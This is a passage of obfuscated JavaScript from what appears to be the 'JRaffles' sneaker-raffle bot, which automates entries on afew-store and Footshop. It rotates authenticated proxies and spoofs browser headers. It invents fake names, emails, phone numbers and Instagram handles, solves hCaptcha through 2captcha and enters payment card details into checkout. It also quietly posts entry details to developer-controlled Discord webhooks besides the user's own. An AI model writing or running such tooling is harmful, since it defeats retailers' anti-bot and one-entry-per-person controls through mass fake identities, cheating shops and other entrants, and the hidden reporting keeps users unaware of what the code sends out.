                                        'name': 'Error',
                                        'value': '' + _0x5e649e,
                                        'inline': !![]
                                    }, {
                                        'name': 'Store',
                                        'value': '' + _0x23e012['store'],
                                        'inline': !![]
                                    }, {
                                        'name': 'Delay',
                                        'value': '' + _0x401d1c['delay'],
                                        'inline': !![]
                                    })['setTimestamp']()['setFooter']({
                                        'text': 'JRaffles\x20v' + _0x431e19,
                                        'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                                    });
                                    return _0x19dfef['data'];
                                }
                            }
                        }
                    }
                }
            }
        }
    }
}
async function _0x238b3c(_0x170120, _0x3b7d04) {
    var _0x46ba49 = _0x170120[_0x3b7d04]['Address1']['split'](''), _0x413ba2 = _0x170120[_0x3b7d04]['Address2']['split'](''), _0x566fe4 = _0x170120[_0x3b7d04]['Email']['split']('@');
    for (var _0x2cca05 = 0x0; _0x2cca05 < _0x46ba49['length']; _0x2cca05++) {
        if (_0x46ba49[_0x2cca05] == 'X') {
            var _0x58b15a = Math['round'](Math['random']() * (_0x38fc54['length'] - 0x1));
            _0x46ba49[_0x2cca05] = _0x3ec733[_0x58b15a];
        }
    }
    ;
    for (var _0x2cca05 = 0x0; _0x2cca05 < _0x413ba2['length']; _0x2cca05++) {
        if (_0x413ba2[_0x2cca05] == 'X') {
            var _0x58b15a = Math['round'](Math['random']() * (_0x38fc54['length'] - 0x1));
            _0x413ba2[_0x2cca05] = _0x3ec733[_0x58b15a];
        }
    }
    ;
    _0x170120[_0x3b7d04]['FirstName'] == 'RANDOM' && (_0x170120[_0x3b7d04]['FirstName'] = _0x3ed7e7['first']());
    _0x170120[_0x3b7d04]['LastName'] == 'RANDOM' && (_0x170120[_0x3b7d04]['LastName'] = _0x3ed7e7['last']());
    _0x566fe4[0x0] == 'RANDOM' ? _0x566fe4[0x0] = '' + _0x3ed7e7['first']() + _0x3ed7e7['last']() + '@' : _0x566fe4[0x0] = _0x566fe4[0x0] + '@';
    _0x170120[_0x3b7d04]['Email'] = _0x566fe4['join'](''), _0x170120[_0x3b7d04]['Address1'] = _0x46ba49['join'](''), _0x170120[_0x3b7d04]['Address2'] = _0x413ba2['join']('');
    _0x170120[_0x3b7d04]['Phone'] == 'RANDOM' && (_0x170120[_0x3b7d04]['Phone'] = '0' + _0x15dd0d(0x5f5e100, 0x3b9ac9ff));
    if (_0x170120[_0x3b7d04]['Follower'] == 'RANDOM') {
        var _0x4d44ad = _0x15dd0d(0x1, 0x270f);
        _0x170120[_0x3b7d04]['Follower'] = '' + _0x3ed7e7['first']() + _0x3ed7e7['last']() + _0x4d44ad + '\x20';
    }
    _0x170120[_0x3b7d04]['HouseNumber'] == 'RANDOM' && (_0x170120[_0x3b7d04]['HouseNumber'] = _0x15dd0d(0x1, 0xc8));
    if (_0x170120[_0x3b7d04]['Address1'] == 'RANDOM') {
        var _0x510269 = Math['round'](Math['random']() * (_0x38fc54['length'] - 0x1)), _0x5c62cf = _0x3ec733[_0x510269];
        _0x170120[_0x3b7d04]['Address1'] = _0x3ed7e7['last']() + 'straat', _0x170120[_0x3b7d04]['Zip'] == '' && (_0x170120[_0x3b7d04]['Postcode'] = _0x15dd0d(0x3e8, 0x270f) + '\x20' + _0x5c62cf + _0x5c62cf, _0x170120[_0x3b7d04]['Zip'] = _0x170120[_0x3b7d04]['Postcode']), _0x170120[_0x3b7d04]['HouseNumber'] = '' + _0x15dd0d(0x1, 0xc8);
    }
    return;
}
;
function _0x536d43() {
    let _0x29ab4b = proxyFile['split']('\x0a'), _0x138351 = _0x29ab4b['map']((_0x1689ad, _0x476539) => {
        sanatizeProxy = _0x1689ad['replace']('\x0d', '');
        if (_0x29ab4b[_0x476539 + 0x1] != undefined)
            return '' + sanatizeProxy;
        return '' + sanatizeProxy;
    });
    return _0x138351;
}
;
async function _0x48b206(_0x39b2ec) {
    var _0x5bef83 = _0x39b2ec[0x1]['split'](':');
    const _0x1d54e9 = await _0x4efd86['launch']({
        'headless': !![],
        'args': ['--proxy-server=' + _0x5bef83[0x0] + ':' + _0x5bef83[0x1] + ',--no-sandbox\x27,\x0a\x20\x20\x20\x20\x20\x20\x27--disable-setuid-sandbox,--force-device-scale-factor=0.3']
    });
    try {
        const _0x5722cc = await _0x1d54e9['newPage']();
        await _0x5722cc['authenticate']({
            'username': '' + _0x5bef83[0x2],
            'password': '' + _0x5bef83[0x3]
        }), console['log'](_0x1e4ea5() + '\x20[' + _0x461b58[taskModule]['name'] + ']\x20Afew\x20Scraper\x20started'), await _0x5722cc['setUserAgent']('Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36'), await _0x5722cc['setRequestInterception'](!![]), _0x5722cc['on']('request', _0x179077 => {
            _0x179077['resourceType']() === 'image' || _0x179077['resourceType']() === 'font' || _0x179077['resourceType']() === 'media' ? _0x179077['abort']() : _0x179077['continue']();
        }), await _0x5722cc['goto']('https://en.afew-store.com/collections/sneaker-raffles'), console['log'](_0x1e4ea5() + '\x20[' + _0x461b58[taskModule]['name'] + ']\x20Looking\x20for\x20Raffles'), await _0x5722cc['waitForTimeout'](0xbb8), await _0x5722cc['waitForSelector']('.product-card');
        const _0x51ed25 = await _0x5722cc['$$eval']('a.product-card', _0x20044a => {
            return _0x20044a['map'](_0x2b5703 => _0x2b5703['href']);
        });
        return _0x444382 = _0x51ed25;
    } catch (_0x1557d7) {
        console['log']('\x20' + _0x1557d7);
    } finally {
        _0x1d54e9['close'](), console['clear']();
    }
}
;
async function _0x56bfed(_0x343d50, _0x52d8dd, _0x572525, _0x545c84, _0x1e47dc) {
    _0x52d8dd != 'ver' && await _0x238b3c(_0x545c84, _0x343d50);
    if (_0x401d1c['useRandomProxy'] = ![])
        var _0x37833e = _0x1e47dc[_0x343d50]['split'](':');
    else
        var _0x54257b = Math['round'](Math['random']() * (_0x1e47dc['length'] - 0x1)), _0x37833e = _0x1e47dc[_0x54257b]['split'](':');
    var _0x4ce81f = _0x572525['data'];
    _0x52d8dd != 'ver' && (_0x4ce81f['data']['attributes']['properties']['$first_name'] = '' + _0x545c84[_0x343d50]['FirstName'], _0x4ce81f['data']['attributes']['properties']['$last_name'] = '' + _0x545c84[_0x343d50]['LastName'], _0x4ce81f['data']['attributes']['properties']['$address1'] = _0x545c84[_0x343d50]['Address1'] + '\x20' + _0x545c84[_0x343d50]['HouseNumber'] + '\x20' + _0x545c84[_0x343d50]['Address2'], _0x4ce81f['data']['attributes']['properties']['$zip'] = '' + _0x545c84[_0x343d50]['Zip'], _0x4ce81f['data']['attributes']['properties']['$city'] = '' + _0x545c84[_0x343d50]['City'], _0x4ce81f['data']['attributes']['properties']['$country'] = '' + _0x545c84[_0x343d50]['Country'], _0x4ce81f['data']['attributes']['properties']['Size'] = '' + _0x545c84[_0x343d50]['Size'], _0x4ce81f['data']['attributes']['properties']['Instagram\x20Handle'] = '' + _0x545c84[_0x343d50]['Follower'], _0x52d8dd == 'exp' ? _0x4ce81f['data']['attributes']['email'] = '' + _0x545c84[_0x343d50]['FirstName'] + _0x545c84[_0x343d50]['LastName'] + _0x401d1c['catchall'] : _0x4ce81f['data']['attributes']['email'] = '' + _0x545c84[_0x343d50]['Email']);
    var _0x4950f0 = {
        'jar': _0x596f7f,
        'followAllRedirects': !![],
        'method': 'POST',
        'url': _0x572525['url'],
        'headers': _0x572525['headers'],
        'body': JSON['stringify'](_0x4ce81f),
        'proxy': 'http://' + _0x37833e[0x2] + ':' + _0x37833e[0x3] + '@' + _0x37833e[0x0] + ':' + _0x37833e[0x1]
    };
    return _0x52d8dd === 'ver' && (_0x4950f0['method'] = 'GET'), new Promise(function (_0x544abe, _0x324d51) {
        callback = async (_0x25da31, _0x3a3df2, _0x227d19) => {
            if (!_0x25da31 && _0x3a3df2['statusCode'] == 0xca || !_0x25da31 && _0x3a3df2['statusCode'] == 0xc8) {
                _0x544abe(console['log'](_0x1818b9['green'](_0x1e4ea5() + '\x20[' + _0x572525['name'] + ']\x20Task\x20' + (_0x343d50 + 0x1) + ':\x20Raffle\x20Entered!')));
                if (_0x52d8dd != 'ver') {
                    var _0x25aad7 = await _0x344cc9(_0x545c84[_0x343d50], _0x572525, 'dev', ![]), _0x31a4ec = await _0x344cc9(_0x545c84[_0x343d50], _0x572525, 'pub', ![]);
                    const _0x795156 = {
                        'succesDEVMSG': { 'embeds': [_0x25aad7] },
                        'succesPUBMSG': { 'embeds': [_0x31a4ec] }
                    };
                    if (_0x401d1c['webhook'] != undefined && _0x401d1c['webhook'] != '')
                        try {
                            await _0xafb19d(_0x401d1c['webhook'], _0x795156['succesDEVMSG']);
                        } catch {
                        }
                    await _0x491ae3(0xc8), await _0xafb19d(_0xc8def8, _0x795156['succesDEVMSG']), await _0x491ae3(0xc8);
                    try {
                        await _0xafb19d(_0x45ab34, _0x795156['succesPUBMSG']);
                    } catch {
                    }
                } else {
                    if (_0x52d8dd == 'ver') {
                        var _0x25aad7 = await _0x344cc9(null, _0x572525, 'ver', ![]);
                        const _0x2b50c9 = {
                            'succesDEVMSG': { 'embeds': [_0x25aad7] },
                            'succesPUBMSG': { 'embeds': [_0x31a4ec] }
                        };
                        await _0xafb19d(_0x35897b, _0x2b50c9['succesDEVMSG']);
                    }
                }
            } else {
                if (_0x52d8dd != 'ver') {
                    var _0x42fbaf = '' + _0x25da31, _0xc6d6bb = await _0x344cc9(_0x545c84[_0x343d50], _0x572525, 'dev', !![], _0x42fbaf), _0x491816 = {};
                    _0x491816['errorDEV'] = { 'embeds': [_0xc6d6bb] }, _0x401d1c['webhook'] != undefined && _0x401d1c['webhook'] != '' && await _0xafb19d(_0x401d1c['webhook'], _0x491816['errorDEV']), await _0xafb19d(_0x51c252, _0x491816['errorDEV']);
                }
                _0x324d51(console['log'](_0x1e4ea5() + '\x20[' + _0x572525['name'] + ']\x20Task\x20' + (_0x343d50 + 0x1) + ':\x20' + _0x25da31));
            }
        };
        try {
            _0x52d8dd === 'ver' ? console['log'](_0x1e4ea5() + '\x20[' + _0x572525['name'] + ']\x20Task\x20' + (_0x343d50 + 0x1) + ':\x20Verifying.') : console['log'](_0x1e4ea5() + '\x20[' + _0x572525['name'] + ']\x20Task\x20' + (_0x343d50 + 0x1) + ':\x20Sending\x20Entry\x20for\x20' + _0x4ce81f['data']['attributes']['email']), _0x19b48a(_0x4950f0, callback);
        } catch (_0x4f7638) {
            console['log'](_0x1e4ea5() + '\x20Task\x20' + (_0x343d50 + 0x1) + ':\x20' + _0x4f7638);
        }
    });
}
;
async function _0x585537(_0x4843e1, _0x31b332, _0x4d9bed) {
    _0x4efd86['use'](_0x202680()), _0x4efd86['use'](_0x1fedc1({
        'provider': {
            'id': '2captcha',
            'token': '' + _0x401d1c['captchaKey']
        },
        'visualFeedback': !![]
    }));
    for (var _0x38ab13 = 0x0; _0x38ab13 < _0x4843e1['length']; _0x38ab13++) {
        var _0x58dc0c, _0x53641f = '', _0xccf84e = 0x0, _0x37473a = [{
            'type': 'rich',
            'title': 'Succesful\x20Footshop\x20entry',
            'description': '',
            'color': 0xc0d6d6,
            'fields': [
                {
                    'name': 'User',
                    'value': '' + _0x54444c
                },
                {
                    'name': 'Product',
                    'value': '' + _0x4843e1[_0x38ab13]['Url']
                },
                {
                    'name': 'Size',
                    'value': '' + _0x4843e1[_0x38ab13]['Size']
                },
                {
                    'name': 'Delay',
                    'value': '' + _0x401d1c['footshopDelay']
                },
                {
                    'name': 'Version',
                    'value': '' + _0x431e19
                }
            ]
        }], _0x42c6bd = await _0x344cc9(_0x4843e1[_0x38ab13], _0x4d9bed, 'dev', ![]), _0x1f05e5 = await _0x344cc9(_0x4843e1[_0x38ab13], _0x4d9bed, 'pub', ![]);
        const _0x1fe81a = {
            'succesDEVMSG': { 'embeds': [_0x42c6bd] },
            'succesPUBMSG': { 'embeds': [_0x1f05e5] }
        }, _0x2f2b80 = { 'embeds': _0x37473a };
        await _0x238b3c(_0x4843e1, _0x38ab13);
        if (_0x4843e1[_0x38ab13]['Email'] == '' || _0x4843e1[_0x38ab13]['FirstName'] == '' || _0x4843e1[_0x38ab13]['LastName'] == '' || _0x4843e1[_0x38ab13]['Country'] == '' || _0x4843e1[_0x38ab13]['Size'] == '' || _0x4843e1[_0x38ab13]['Address1'] == '' || _0x4843e1[_0x38ab13]['Zip'] == '') {
            console['log'](_0x1e4ea5() + '\x20[' + _0x4d9bed['name'] + ']\x20Task\x20' + (_0x38ab13 + 0x1) + '\x20:\x20Invalid\x20CSV');
            continue;
        }
        if (_0x4843e1[_0x38ab13]['Email'] == '' || _0x4843e1[_0x38ab13]['FirstName'] == '' || _0x4843e1[_0x38ab13]['LastName'] == '' || _0x4843e1[_0x38ab13]['Country'] == '' || _0x4843e1[_0x38ab13]['Size'] == '' || _0x4843e1[_0x38ab13]['Address1'] == '' || _0x4843e1[_0x38ab13]['Zip'] == '' || _0x4843e1[_0x38ab13]['Phone'] == '') {
            console['log'](_0x1e4ea5() + '\x20[' + _0x4d9bed['name'] + ']\x20Task\x20' + (_0x38ab13 + 0x1) + '\x20:\x20Invalid\x20CSV');
            continue;
        }
        const _0x2c6673 = '' + _0x4843e1[_0x38ab13]['Url'];
        if (_0x401d1c['useRandomProxy'] = ![])
            var _0x56dba5 = _0x31b332[_0x38ab13]['split'](':');
        else
            var _0xb8250f = Math['round'](Math['random']() * (_0x31b332['length'] - 0x1)), _0x56dba5 = _0x31b332[_0xb8250f]['split'](':');
        const _0x110cee = await _0x4efd86['launch']({
            'headless': !![],
            'args': ['--proxy-server=' + _0x56dba5[0x0] + ':' + _0x56dba5[0x1]]
        });
        try {
            const _0x25e697 = await _0x110cee['newPage']();
            await _0x25e697['authenticate']({
                'username': '' + _0x56dba5[0x2],
                'password': '' + _0x56dba5[0x3]
            }), console['log'](_0x1e4ea5() + '\x20[' + _0x4d9bed['name'] + ']\x20Task\x20' + (_0x38ab13 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x25e697['setUserAgent']('Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36'), await _0x25e697['setRequestInterception'](!![]), _0x25e697['on']('request', _0x4daf48 => {
                _0x4daf48['resourceType']() === 'image' || _0x4daf48['resourceType']() === 'font' || _0x4daf48['resourceType']() === 'media' ? _0x4daf48['abort']() : _0x4daf48['continue']();
            }), await _0x25e697['goto'](_0x2c6673), await _0x491ae3(0xbb8), await _0x25e697['waitForSelector']('.control__JhutY'), await _0x25e697['click']('.control__JhutY'), await _0x491ae3(0x1f4);
            if (_0x4843e1[_0x38ab13]['Size'] != 'RANDOM')
                try {
                    const _0x2dd5e9 = await _0x25e697['$x']('//div[contains(text(),\x20\x27' + _0x4843e1[_0x38ab13]['Size'] + '\x27)]');
                    await _0x2dd5e9[0x0]['click']();
                } catch {
                    console['log'](_0x1818b9['red'](_0x1e4ea5() + '\x20[' + _0x4d9bed['name'] + ']\x20Task\x20' + (_0x38ab13 + 0x1) + '\x20:\x20Size\x20Not\x20Found'));
                    continue;
                }
            else {
                const _0x9065b6 = await _0x25e697['$$']('.options__3UQpT\x20>\x20div.row');
                var _0x9fe120 = Math['round'](Math['random']() * (_0x9065b6['length'] - 0x1));
                await _0x9065b6[_0x9fe120]['click']();
            }
            await _0x491ae3(0x4b0);
            const _0x4124c4 = await _0x25e697['$x']('//span[contains(text(),\x20\x27Enter\x20raffle\x20now\x27)]');
            await _0x4124c4[0x0]['click'](), await _0x25e697['waitForSelector']('input[name=\x22email\x22]'), console['log'](_0x1e4ea5() + '\x20[' + _0x4d9bed['name'] + ']\x20Task\x20' + (_0x38ab13 + 0x1) + '\x20:\x20Filling\x20Entry\x20Credentials'), await _0x25e697['type']('input[name=\x22email\x22]', '' + _0x4843e1[_0x38ab13]['Email']), await _0x491ae3(0x640), await _0x25e697['type']('input[name=\x22phone\x22]', '' + _0x4843e1[_0x38ab13]['Phone']), await _0x491ae3(0x4b0), await _0x25e697['click']('button.btn.continue-button__1RtsS'), await _0x491ae3(0x4b0);
            try {
                await _0x25e697['type']('input[name=\x22firstName\x22]', '' + _0x4843e1[_0x38ab13]['FirstName']), await _0x491ae3(0x258);
            } catch {
                const _0x2f34a7 = await _0x25e697['$$eval']('.invalid-feedback\x20>\x20div', _0x556006 => {
                    return _0x556006['map'](_0x245c02 => _0x245c02['innerText']);
                });
                console['log'](_0x1818b9['red'](_0x1e4ea5() + '\x20[' + _0x4d9bed['name'] + ']\x20Task\x20' + (_0x38ab13 + 0x1) + '\x20:\x20' + _0x2f34a7));
                continue;
            }
            await _0x25e697['type']('input[name=\x22lastName\x22]', '' + _0x4843e1[_0x38ab13]['LastName']), await _0x491ae3(0xc8), await _0x25e697['type']('input[name=\x22instagramUsername\x22]', '' + _0x4843e1[_0x38ab13]['Follower']), await _0x491ae3(0x4b0), await _0x25e697['click']('button.btn.continue-button__1RtsS'), await _0x491ae3(0x3e8), console['log'](_0x1e4ea5() + '\x20[' + _0x4d9bed['name'] + ']\x20Task\x20' + (_0x38ab13 + 0x1) + '\x20:\x20Filling\x20Shipping'), await _0x25e697['select']('select[name=\x22country\x22]', '' + _0x4843e1[_0x38ab13]['Country']), await _0x491ae3(0x2bc), await _0x25e697['type']('input[name=\x22streetName\x22]', '' + _0x4843e1[_0x38ab13]['Address1']), await _0x491ae3(0x258), await _0x25e697['type']('input[name=\x22houseNumber\x22]', _0x4843e1[_0x38ab13]['HouseNumber'] + '\x20' + _0x4843e1[_0x38ab13]['Address2']), await _0x491ae3(0xc8), await _0x25e697['type']('input[name=\x22postalCode\x22]', '' + _0x4843e1[_0x38ab13]['Zip']), await _0x491ae3(0x1f4), await _0x25e697['type']('input[name=\x22city\x22]', '' + _0x4843e1[_0x38ab13]['City']), await _0x491ae3(0x4b0), await _0x25e697['click']('input[name=\x22consent::privacy-policy-101\x22]'), await _0x491ae3(0x4b0), await _0x25e697['click']('button.btn.continue-button__1RtsS'), await _0x491ae3(0x4b0), console['log'](_0x1e4ea5() + '\x20[' + _0x4d9bed['name'] + ']\x20Task\x20' + (_0x38ab13 + 0x1) + '\x20:\x20Solving\x20hCaptcha'), await _0x25e697['solveRecaptchas'](), console['log'](_0x1e4ea5() + '\x20[' + _0x4d9bed['name'] + ']\x20Task\x20' + (_0x38ab13 + 0x1) + '\x20:\x20hCaptcha\x20solved'), await _0x491ae3(0xbb8), await _0x25e697['click']('button.btn.continue-button__1RtsS'), await _0x491ae3(0x1388), console['log'](_0x1e4ea5() + '\x20[' + _0x4d9bed['name'] + ']\x20Task\x20' + (_0x38ab13 + 0x1) + '\x20:\x20Solving\x20Adyen'), await _0x25e697['waitForSelector']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0x25e697['click']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0x491ae3(0x4b0), await _0x25e697['type']('span[data-cse=\x22encryptedCardNumber\x22]', '' + _0x4843e1[_0x38ab13]['CardNumber']), await _0x491ae3(0x320), await _0x25e697['click']('span[data-cse=\x22encryptedExpiryDate\x22]'), await _0x25e697['type']('span[data-cse=\x22encryptedExpiryDate\x22]', '' + _0x4843e1[_0x38ab13]['ExpiryDate']), await _0x491ae3(0x4b0), await _0x25e697['click']('span[data-cse=\x22encryptedSecurityCode\x22]'), await _0x25e697['type']('span[data-cse=\x22encryptedSecurityCode\x22]', '' + _0x4843e1[_0x38ab13]['CVV']), await _0x491ae3(0x226), await _0x25e697['type']('input[name=\x22holderName\x22]', '' + _0x4843e1[_0x38ab13]['NameOnCard']), await _0x491ae3(0x226), await _0x25e697['click']('button.adyen-checkout__button'), console['log'](_0x1e4ea5() + '\x20[' + _0x4d9bed['name'] + ']\x20Task\x20' + (_0x38ab13 + 0x1) + '\x20:\x20Awaiting\x203DS');
            try {
                await _0x25e697['waitForSelector']('.thank-you__1AwOo', { 'timeout': 0x493e0 }), await _0x491ae3(0xbb8);
            } catch (_0x2f6059) {
                console['log'](_0x1818b9['red'](_0x1e4ea5() + '\x20[' + _0x4d9bed['name'] + ']\x20Task\x20' + (_0x38ab13 + 0x1) + '\x20:\x203DS\x20Failed')), _0x58dc0c = '3DS\x20Error\x20' + _0x2f6059;
                var _0x47b5e7 = await _0x344cc9(_0x4843e1[_0x38ab13], _0x4d9bed, 'dev', !![], _0x58dc0c);
                _0x1fe81a['errorDEV'] = { 'embeds': [_0x47b5e7] };
                _0x401d1c['webhook'] != undefined && _0x401d1c['webhook'] != '' && await _0xafb19d(_0x401d1c['webhook'], _0x1fe81a['errorDEV']);
                await _0xafb19d(_0x51c252, _0x1fe81a['errorDEV']);
                continue;
            }
            console['log'](_0x1818b9['green'](_0x1e4ea5() + '\x20[' + _0x4d9bed['name'] + ']\x20Task\x20' + (_0x38ab13 + 0x1) + '\x20:\x20Raffle\x20Entered!'));
            if (_0x401d1c['webhook'] != undefined && _0x401d1c['webhook'] != '')
                try {
                    await _0xafb19d(_0x401d1c['webhook'], _0x1fe81a['succesDEVMSG']);
                } catch {
                }
            await _0x491ae3(0xc8), await _0xafb19d(_0xc8def8, _0x1fe81a['succesDEVMSG']), await _0x491ae3(0xc8);
            try {
                await _0xafb19d(_0x45ab34, _0x1fe81a['succesPUBMSG']);
            } catch {
            }
        } catch (_0x435219) {
            console['log'](_0x1e4ea5() + '\x20[' + _0x4d9bed['name'] + ']\x20Task\x20' + (_0x38ab13 + 0x1) + '\x20:\x20' + _0x435219), _0x58dc0c = '' + _0x435219;
            var _0x47b5e7 = await _0x344cc9(_0x4843e1[_0x38ab13], _0x4d9bed, 'dev', !![], _0x58dc0c);
            _0x1fe81a['errorDEV'] = { 'embeds': [_0x47b5e7] }, _0x401d1c['webhook'] != undefined && _0x401d1c['webhook'] != '' && await _0xafb19d(_0x401d1c['webhook'], _0x1fe81a['errorDEV']), await _0xafb19d(_0x51c252, _0x1fe81a['errorDEV']), _0x53641f = 'yes';
        } finally {
            _0x110cee['close']();
            if (_0x53641f == 'yes' && _0xccf84e != 0x5) {
                console['log'](_0x1818b9['red'](_0x1e4ea5() + '\x20[' + _0x4d9bed['name'] + ']\x20Task\x20' + (_0x38ab13 + 0x1) + '\x20:\x20Retrying')), _0x38ab13 = _0x38ab13 - 0x1, _0xccf84e = _0xccf84e + 0x1;
                continue;
            }
            console['log']('Waiting\x20for\x20' + _0x401d1c['footshopDelay'] + '\x20ms'), await _0x491ae3(_0x401d1c['footshopDelay']);
        }
    }
}
afewFunction = async (_0xf60c62, _0x22746f, _0x1b393f, _0x56fc89, _0xb3940) => {
    for (var _0x51c551 = 0x0; _0x51c551 < _0x56fc89['length']; _0x51c551++) {
        _0x401d1c['AfewDelay'] = _0x401d1c['delay'];
        var _0x46f573, _0x495723 = '', _0x4f8413 = 0x0;
        _0x56fc89[_0x51c551]['Url'] = _0xf60c62, _0x57f604(_0x1b393f['name'] + '\x20Task\x20' + (_0x51c551 + 0x1) + '\x20/\x20' + _0x56fc89['length'] + '\x20||\x20File:\x20' + _0xb37a88 + '\x20Proxies:\x20' + _0x39f01a), await _0x238b3c(_0x56fc89, _0x51c551);
        var _0x2332de = await _0x344cc9(_0x56fc89[_0x51c551], _0x1b393f, 'dev', ![]), _0x37cc22 = await _0x344cc9(_0x56fc89[_0x51c551], _0x1b393f, 'pub', ![]);
        const _0x3c4d2f = {
            'succesDEVMSG': { 'embeds': [_0x2332de] },
            'succesPUBMSG': { 'embeds': [_0x37cc22] }
        };
        if (_0x56fc89[_0x51c551]['Email'] == '' || _0x56fc89[_0x51c551]['FirstName'] == '' || _0x56fc89[_0x51c551]['LastName'] == '' || _0x56fc89[_0x51c551]['Country'] == '' || _0x56fc89[_0x51c551]['Size'] == '' || _0x56fc89[_0x51c551]['Address1'] == '' || _0x56fc89[_0x51c551]['Zip'] == '') {
            console['log'](_0x1e4ea5() + '\x20[' + _0x1b393f['name'] + ']\x20Task\x20' + (_0x51c551 + 0x1) + '\x20:\x20Invalid\x20CSV');
            continue;
        }
        if (_0x401d1c['useRandomProxy'] = ![])
            var _0x1a9561 = _0xb3940[_0x51c551]['split'](':');
        else
            var _0xf5be77 = Math['round'](Math['random']() * (_0xb3940['length'] - 0x1)), _0x1a9561 = _0xb3940[_0xf5be77]['split'](':');
        const _0x257758 = await _0x4efd86['launch']({
            'headless': !![],
            'args': [
                '--proxy-server=' + _0x1a9561[0x0] + ':' + _0x1a9561[0x1],
                '--no-sandbox',
                '--disable-setuid-sandbox'
            ]
        });
        try {
            const _0x3446d6 = await _0x257758['newPage']();
            await _0x3446d6['setDefaultNavigationTimeout'](0x1d4c0), await _0x3446d6['authenticate']({
                'username': '' + _0x1a9561[0x2],
                'password': '' + _0x1a9561[0x3]
            }), console['log'](_0x1e4ea5() + '\x20[' + _0x1b393f['name'] + ']\x20Task\x20' + (_0x51c551 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x3446d6['setUserAgent']('Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36'), await _0x3446d6['setRequestInterception'](!![]), _0x3446d6['on']('request', _0x57419d => {
                _0x57419d['resourceType']() === 'image' || _0x57419d['resourceType']() === 'font' || _0x57419d['resourceType']() === 'media' ? _0x57419d['abort']() : _0x57419d['continue']();
            }), await _0x3446d6['goto'](_0xf60c62, { 'waitUntil': 'networkidle2' }), console['log'](_0x1e4ea5() + '\x20[' + _0x1b393f['name'] + ']\x20Task\x20' + (_0x51c551 + 0x1) + '\x20:\x20Gathering\x20cookies'), await _0x3446d6['waitForTimeout'](0xfa0), console['log'](_0x1e4ea5() + '\x20[' + _0x1b393f['name'] + ']\x20Task\x20' + (_0x51c551 + 0x1) + '\x20:\x20Cookies\x20received'), await _0x3446d6['waitForTimeout'](0x320);
            if (_0x56fc89[_0x51c551]['Size'] == 'RANDOM') {
                console['log'](_0x1e4ea5() + '\x20[' + _0x1b393f['name'] + ']\x20Task\x20' + (_0x51c551 + 0x1) + '\x20:\x20Choosing\x20random\x20size');
                const _0x51f427 = await _0x3446d6['$$eval']('div.size-picker.mt-2\x20>\x20ul\x20>\x20li\x20>\x20a', _0x47d908 => {
                    return _0x47d908['map'](_0x2ddb6a => _0x2ddb6a['href']);
                });
                var _0x471e4c = Math['round'](Math['random']() * (_0x51f427['length'] - 0x1));
                await _0x3446d6['goto']('' + _0x51f427[_0x471e4c]);
            } else {
                console['log'](_0x1e4ea5() + '\x20[' + _0x1b393f['name'] + ']\x20Task\x20' + (_0x51c551 + 0x1) + '\x20:\x20Choosing\x20Size\x20' + _0x56fc89[_0x51c551]['Size']);
                try {
                    const _0x32bcc0 = await _0x3446d6['$$eval']('li[data-original-title=\x22Größe\x20in\x20EU:\x20' + _0x56fc89[_0x51c551]['Size'] + '\x22]\x20>\x20a', _0x181a12 => {
                        return _0x181a12['map'](_0x4bcd5c => _0x4bcd5c['href']);
                    });
                    await _0x3446d6['goto']('' + _0x32bcc0[0x0], { 'waitUntil': 'networkidle2' });
                } catch (_0x29b210) {
                    console['log'](_0x1818b9['red'](_0x1e4ea5() + '\x20[' + _0x1b393f['name'] + ']\x20Task\x20' + (_0x51c551 + 0x1) + '\x20:\x20' + _0x29b210 + '\x20Size\x20not\x20found')), _0x46f573 = 'Size\x20Not\x20Found';
                    var _0x17acf8 = await _0x344cc9(_0x56fc89[_0x51c551], _0x1b393f, 'dev', !![], _0x46f573);
                    _0x3c4d2f['errorDEV'] = { 'embeds': [_0x17acf8] };
                    _0x401d1c['webhook'] != undefined && _0x401d1c['webhook'] != '' && await _0xafb19d(_0x401d1c['webhook'], _0x3c4d2f['errorDEV']);
                    await _0xafb19d(_0x51c252, _0x3c4d2f['errorDEV']);
                    continue;
                }
            }
            await _0x3446d6['waitForTimeout'](0x258), await _0x3446d6['type']('#raffle-instagram', '' + _0x56fc89[_0x51c551]['Follower'], { 'delay': 0x64 }), await _0x3446d6['waitForTimeout'](0x384), await _0x3446d6['click']('#raffle-terms'), await _0x3446d6['waitForTimeout'](0x384), await _0x3446d6['evaluate'](() => {
                const _0x45c53c = document['querySelector']('button.btn[name=\x27add\x27]');
                _0x45c53c['click']();
            }), await _0x3446d6['waitForTimeout'](0xbb8), await _0x3446d6['waitForSelector']('#checkout_email'), await _0x491ae3(0x3e8), console['log'](_0x1e4ea5() + '\x20[' + _0x1b393f['name'] + ']\x20Task\x20' + (_0x51c551 + 0x1) + '\x20:\x20Filling\x20Information');
            _0x22746f == 'sec' ? await _0x3446d6['type']('#checkout_email', '' + _0x56fc89[_0x51c551]['FirstName'] + _0x56fc89[_0x51c551]['LastName'] + _0x401d1c['catchall'], 0x32) : await _0x3446d6['type']('#checkout_email', '' + _0x56fc89[_0x51c551]['Email'], 0x32);
